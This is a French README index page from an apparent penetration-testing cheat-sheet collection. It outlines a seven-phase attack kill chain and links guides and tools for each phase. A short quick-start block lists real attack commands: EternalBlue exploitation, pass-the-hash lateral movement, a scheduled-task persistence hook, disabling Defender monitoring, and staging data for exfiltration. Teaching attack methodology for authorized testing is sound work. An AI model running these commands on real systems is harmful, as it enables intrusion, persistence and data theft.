# 🎯 Méthodologie d’attaque — Kill Chain

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 Qu’est-ce que la Kill Chain d’une attaque ?

L’**Attack Kill Chain** décrit les étapes suivies par un attaquant pour compromettre et exploiter un système ou un réseau cible. Le texte anglais la rapproche de la **Cyber Kill Chain** et de **MITRE ATT&CK**.

> **Précision :** MITRE ATT&CK est une base de connaissances sur les tactiques et techniques adverses, et non un autre nom de la Cyber Kill Chain. Les sept phases ci-dessous constituent l’organisation pédagogique de ce guide. Voir la [présentation officielle de MITRE ATT&CK](https://attack.mitre.org/).

---

## 📊 Phases de la Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK LIFECYCLE                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. INITIAL   │───▶│ 2. DISCOVERY │───▶│ 3. PRIVILEGE         │        │
│   │    ACCESS    │    │ ENUMERATION  │    │    ESCALATION        │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. LATERAL           │          │
│          │                               │    MOVEMENT          │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. ACTIONS   │◀───│ 6. DEFENSE   │◀───│ 5. PERSISTENCE       │        │
│   │ ON OBJECTIVES│    │    EVASION   │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Guides par phase

| Phase | Description | Guide |
|-------|-------------|-------|
| **1. Accès initial** | Premier accès à la cible | [📄 Voir](./01-Initial-Access.fr.md) |
| **2. Découverte/énumération** | Recueillir des informations sur le système compromis | [📄 Voir](./02-Enumeration.fr.md) |
| **3. Élévation de privilèges** | Obtenir les privilèges admin/root | [📄 Voir](./03-Privilege-Escalation.fr.md) |
| **4. Déplacement latéral** | Se déplacer dans le réseau vers d’autres systèmes | [📄 Voir](./04-Lateral-Movement.fr.md) |
| **5. Persistance** | Conserver l’accès après un redémarrage ou une détection | [📄 Voir](./05-Persistence.fr.md) |
| **6. Évasion des défenses** | Contourner l’antivirus, l’EDR et les contrôles de sécurité | [📄 Voir](./06-Defense-Evasion.fr.md) |
| **7. Actions sur les objectifs** | Atteindre l’objectif final (exfiltration, impact) | [📄 Voir](./07-Actions-Objectives.fr.md) |

---

## 🔗 Fiches associées

### Par phase

| Phase | Outils associés |
|-------|---------------|
| Accès initial | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| Énumération | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| Élévation de privilèges | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| Déplacement latéral | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| Persistance | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| Évasion des défenses | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| Exfiltration de données | [Linux-Commands](../../Linux-Commands/README.md) |

---

## 📚 Démarrage rapide

### Déroulement type d’une attaque
```bash
# 1. Accès initial - Exploiter une vulnérabilité
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Énumération - Découvrir les ressources accessibles
whoami /all
systeminfo
net user

# 3. Élévation de privilèges - Obtenir les droits SYSTEM/root
.\winPEAS.exe

# 4. Déplacement latéral - Passer à d’autres systèmes
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Persistance - Conserver l’accès
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Évasion des défenses - Désactiver l’antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Actions sur les objectifs - Exfiltrer des données
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Ressources

- [Référentiel MITRE ATT&CK](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Suivez la Kill Chain !</b><br>
  <i>Uniquement pour des tests d’intrusion autorisés !</i>
</p>
